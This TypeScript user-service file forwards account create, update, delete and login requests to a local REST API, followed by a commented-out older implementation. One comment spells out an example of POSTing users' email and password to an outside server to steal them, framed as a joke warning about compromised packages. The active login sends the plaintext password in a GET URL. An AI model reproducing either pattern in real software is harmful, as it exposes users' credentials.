import { Container, Service, Inject } from 'typedi';

import jwt from 'jsonwebtoken';
import config from '../../config';
import { randomBytes } from 'crypto';

//import MailerService from './mailer.ts.bak';

import IUserService from '../services/IServices/IUserService';
import { UserMap } from "../mappers/UserMap";
import IUserDTO from '../dto/IUserDTO';


import * as http from 'http';
import * as querystring from 'querystring';

import { Result } from "../core/logic/Result";
import ICreatingUserDTO from '../dto/ICreatingUserDTO';
import IUpdateUserDTO from '../dto/IUpdateUserDTO';


@Service()
export default class UserService implements IUserService {

  constructor() {
  }
  private serverUrl = "http://localhost:6969/api/Users/";


  public async criarUser(userDTO: ICreatingUserDTO): Promise<Result<IUserDTO>> {
    let err = '';
    try {

      const req = "criarUser";

      //const queryString = querystring.stringify({ Name: JSON.stringify(roleDTO.name) });
      const data = {
        name: userDTO.name,
        email: userDTO.email,
        phoneNumber: userDTO.phoneNumber,
        nif: null,
        password: userDTO.password,
        roleId: userDTO.roleId
      };

      const dataString = JSON.stringify(data);
      const urlWithQuery = this.serverUrl + req;

      let solucao;

      const options: http.RequestOptions = {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
      };

      async function makeRequest() {
        return new Promise<string>((resolve, reject) => {
          const request = http.request(urlWithQuery, options, (response) => {
            let data: string;

            if (response.statusCode != 201) {
              err = response.statusMessage;
            }

            response.on('data', (chunk) => {
              data += chunk;
            });

            response.on('end', () => {
              resolve(data);
              const arranged = data.replace("undefined", "");
              try {
                solucao = JSON.parse(arranged) as IUserDTO;
              } catch (Eerr) {
                solucao = arranged;
              }
            });
          });

          request.on('error', (error) => {
            reject(error);
          });

          request.write(dataString);
          request.end();
        });
      }

      await makeRequest();

      if (err.length > 0)
        return Result.fail<IUserDTO>(solucao);

      return Result.ok<IUserDTO>(solucao);

    } catch (e) {
      throw e;
    }
  }

  public async criarUtente(userDTO: ICreatingUserDTO): Promise<Result<IUserDTO>> {
    let err = '';
    try {

      const req = "criarUtente";

      //const queryString = querystring.stringify({ Name: JSON.stringify(roleDTO.name) });
      const data = {
        name: userDTO.name,
        email: userDTO.email,
        phoneNumber: userDTO.phoneNumber,
        nif: userDTO.nif,
        password: userDTO.password,
        roleId: userDTO.roleId
      };

      const dataString = JSON.stringify(data);
      const urlWithQuery = this.serverUrl + req;

      let solucao;

      const options: http.RequestOptions = {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
      };

      async function makeRequest() {
        return new Promise<string>((resolve, reject) => {
          const request = http.request(urlWithQuery, options, (response) => {
            let data: string;

            if (response.statusCode != 201) {
              err = response.statusMessage;
            }

            response.on('data', (chunk) => {
              data += chunk;
            });

            response.on('end', () => {
              resolve(data);
              const arranged = data.replace("undefined", "");
              try {
                solucao = JSON.parse(arranged) as IUserDTO;
              } catch (Eerr) {
                solucao = arranged;
              }
            });
          });

          request.on('error', (error) => {
            reject(error);
          });

          request.write(dataString);
          request.end();
        });
      }

      await makeRequest();

      if (err.length > 0)
        return Result.fail<IUserDTO>(solucao);

      return Result.ok<IUserDTO>(solucao);

    } catch (e) {
      throw e;
    }
  }

  public async updateUser(userEmail: string, userDTO: IUpdateUserDTO): Promise<Result<IUserDTO>> {
    let err = '';
    try {

      const req = "updateUser";

      //const queryString = querystring.stringify({ Name: JSON.stringify(roleDTO.name) });
      const data = {
        name: userDTO.name,
        phoneNumber: userDTO.phoneNumber,
        nif: userDTO.nif,
        password: userDTO.password,
      };

      const dataString = JSON.stringify(data);
      const urlWithQuery = this.serverUrl + req + "/" + userEmail;

      let solucao;

      const options: http.RequestOptions = {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
        },
      };

      async function makeRequest() {
        return new Promise<string>((resolve, reject) => {
          const request = http.request(urlWithQuery, options, (response) => {
            let data: string;

            if (response.statusCode != 200) {
              err = response.statusMessage;
            }

            response.on('data', (chunk) => {
              data += chunk;
            });

            response.on('end', () => {
              resolve(data);
              const arranged = data.replace("undefined", "");
              try {
                solucao = JSON.parse(arranged) as IUserDTO;
              } catch (Eerr) {
                solucao = arranged;
              }
            });
          });

          request.on('error', (error) => {
            reject(error);
          });

          request.write(dataString);
          request.end();
        });
      }

      await makeRequest();

      if (err.length > 0)
        return Result.fail<IUserDTO>(solucao);

      return Result.ok<IUserDTO>(solucao);

    } catch (e) {
      throw e;
    }
  }

  public async getAllUsers(): Promise<Result<IUserDTO[]>> {
    let err = '';
    try {

      const req = "getAllUsers";

      const urlWithQuery = this.serverUrl + req

      let solucao;

      const options: http.RequestOptions = {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        },
      };

      async function makeRequest() {
        return new Promise<string>((resolve, reject) => {
          const request = http.get(urlWithQuery, options, (response) => {
            let data: string;

            if (response.statusCode != 200) {
              err = response.statusMessage;
            }

            response.on('data', (chunk) => {
              data += chunk;
            });

            response.on('end', () => {
              resolve(data);
              const arranged = data.replace("undefined", "");
              try {
                solucao = JSON.parse(arranged) as IUserDTO;
              } catch (Eerr) {
                solucao = arranged;
              }
            });
          });

          request.on('error', (error) => {
            reject(error);
          });

          request.end();
        });
      }

      await makeRequest();

      if (err.length > 0)
        return Result.fail<IUserDTO[]>(solucao);

      return Result.ok<IUserDTO[]>(solucao);

    } catch (e) {
      throw e;
    }
  }

  public async getUserByEmail(userEmail: string): Promise<Result<IUserDTO>> {
    let err = '';
    try {

      const req = "getUserByEmail";

      const urlWithQuery = this.serverUrl + req + "/" + userEmail;

      let solucao;

      const options: http.RequestOptions = {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        },
      };

      async function makeRequest() {
        return new Promise<string>((resolve, reject) => {
          const request = http.get(urlWithQuery, options, (response) => {
            let data: string;

            if (response.statusCode != 200) {
              err = response.statusMessage;
            }

            response.on('data', (chunk) => {
              data += chunk;
            });

            response.on('end', () => {
              resolve(data);
              const arranged = data.replace("undefined", "");
              try {
                solucao = JSON.parse(arranged) as IUserDTO;
              } catch (Eerr) {
                solucao = arranged;
              }
            });
          });

          request.on('error', (error) => {
            reject(error);
          });

          request.end();
        });
      }

      await makeRequest();

      if (err.length > 0)
        return Result.fail<IUserDTO>(solucao);

      return Result.ok<IUserDTO>(solucao);

    } catch (e) {
      throw e;
    }
  }

  public async deleteUser(userEmail: string): Promise<Result<IUserDTO>> {
    let err = '';
    try {

      const req = "deleteUser";

      const urlWithQuery = this.serverUrl + req + "/" + userEmail;

      let solucao;

      const options: http.RequestOptions = {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
        },
      };

      async function makeRequest() {
        return new Promise<string>((resolve, reject) => {
          const request = http.get(urlWithQuery, options, (response) => {
            let data: string;

            if (response.statusCode != 200) {
              err = response.statusMessage;
            }

            response.on('data', (chunk) => {
              data += chunk;
            });

            response.on('end', () => {
              resolve(data);
              const arranged = data.replace("undefined", "");
              try {
                solucao = JSON.parse(arranged) as IUserDTO;
              } catch (Eerr) {
                solucao = arranged;
              }
            });
          });

          request.on('error', (error) => {
            reject(error);
          });

          request.end();
        });
      }

      await makeRequest();

      if (err.length > 0)
        return Result.fail<IUserDTO>(solucao);

      return Result.ok<IUserDTO>(solucao);

    } catch (e) {
      throw e;
    }
  }

  public async login(userEmail: string, userPassword: string): Promise<Result<IUserDTO>> {
    let err = '';
    try {

      const req = "login";

      const urlWithQuery = this.serverUrl + req + "/" + userEmail+ "/"+ userPassword;

      let solucao;

      const options: http.RequestOptions = {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        },
      };

      async function makeRequest() {
        return new Promise<string>((resolve, reject) => {
          const request = http.get(urlWithQuery, options, (response) => {
            let data: string;

            if (response.statusCode != 200) {
              err = response.statusMessage;
            }

            response.on('data', (chunk) => {
              data += chunk;
            });

            response.on('end', () => {
              resolve(data);
              const arranged = data.replace("undefined", "");
              try {
                solucao = JSON.parse(arranged) as IUserDTO;
              } catch (Eerr) {
                solucao = arranged;
              }
            });
          });

          request.on('error', (error) => {
            reject(error);
          });

          request.end();
        });
      }

      await makeRequest();

      if (err.length > 0)
        return Result.fail<IUserDTO>(solucao);

      return Result.ok<IUserDTO>(solucao);

    } catch (e) {
      throw e;
    }
  }

}





/*
@Service()
export default class UserService implements IUserService{
  constructor(
      @Inject(config.repos.user.name) private userRepo : IUserRepo,
      @Inject(config.repos.role.name) private roleRepo : IRoleRepo,
      @Inject('logger') private logger,
  ) {}


  public async SignUp(userDTO: IUserDTO): Promise<Result<{ userDTO: IUserDTO, token: string }>> {
    try {
      const userDocument = await this.userRepo.findByEmail( userDTO.email );
      const found = !!userDocument;
  
      if (found) {
        return Result.fail<{userDTO: IUserDTO, token: string}>("User already exists with email=" + userDTO.email);
      }

      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */

/*
      const salt = randomBytes(32);
      this.logger.silly('Hashing password');
      const hashedPassword = await argon2.hash(userDTO.password, { salt });
      this.logger.silly('Creating user db record');

      const password = await UserPassword.create({ value: hashedPassword, hashed: true}).getValue();
      const email = await UserEmail.create( userDTO.email ).getValue();
      let role: Role;

      const roleOrError = await this.getRole(userDTO.role);
      if (roleOrError.isFailure) {
        return Result.fail<{userDTO: IUserDTO; token: string}>(roleOrError.error);
      } else {
        role = roleOrError.getValue();
      }

      const userOrError = await User.create({
        firstName: userDTO.firstName,
        lastName: userDTO.lastName,
        email: email,
        role: role,
        password: password,
      });

      if (userOrError.isFailure) {
        throw Result.fail<IUserDTO>(userOrError.errorValue());
      }

      const userResult = userOrError.getValue();

      this.logger.silly('Generating JWT');
      const token = this.generateToken(userResult);

      this.logger.silly('Sending welcome email');
      //await this.mailer.SendWelcomeEmail(userResult);

      //this.eventDispatcher.dispatch(events.user.signUp, { user: userResult });

      await this.userRepo.save(userResult);
      const userDTOResult = UserMap.toDTO( userResult ) as IUserDTO;
      return Result.ok<{userDTO: IUserDTO, token: string}>( {userDTO: userDTOResult, token: token} )

    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async SignIn(email: string, password: string): Promise<Result<{ userDTO: IUserDTO, token: string }>> {

    const user = await this.userRepo.findByEmail( email );

    if (!user) {
      throw new Error('User not registered');
    }

    /**
     * We use verify from argon2 to prevent 'timing based' attacks
     */
/*
this.logger.silly('Checking password');
const validPassword = await argon2.verify(user.password.value, password);
if (validPassword) {
  this.logger.silly('Password is valid!');
  this.logger.silly('Generating JWT');
  const token = this.generateToken(user) as string;

  const userDTO = UserMap.toDTO( user ) as IUserDTO;
  return Result.ok<{userDTO: IUserDTO, token: string}>( {userDTO: userDTO, token: token} );
} else {
  throw new Error('Invalid Password');
}
}

private generateToken(user) {
const today = new Date();
const exp = new Date(today);
exp.setDate(today.getDate() + 60);

/**
 * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
 * The cool thing is that you can add custom properties a.k.a metadata
 * Here we are adding the userId, role and name
 * Beware that the metadata is public and can be decoded without _the secret_
 * but the client cannot craft a JWT to fake a userId
 * because it doesn't have _the secret_ to sign it
 * more information here: https://softwareontheroad.com/you-dont-need-passport
 */
/*
this.logger.silly(`Sign JWT for userId: ${user._id}`);

const id = user.id.toString();
const email = user.email.value;
const firstName = user.firstName;
const lastName = user.lastName;
const role = user.role.id.value;

return jwt.sign(
  {
    id: id,
    email: email, // We are gonna use this in the middleware 'isAuth'
    role: role,
    firstName: firstName,
    lastName: lastName,
    exp: exp.getTime() / 1000,
  },
  config.jwtSecret,
);
}


private async getRole (roleId: string): Promise<Result<Role>> {

const role = await this.roleRepo.findByDomainId( roleId );
const found = !!role;

if (found) {
  return Result.ok<Role>(role);
} else {
  return Result.fail<Role>("Couldn't find role by id=" + roleId);
}
}

}
*/
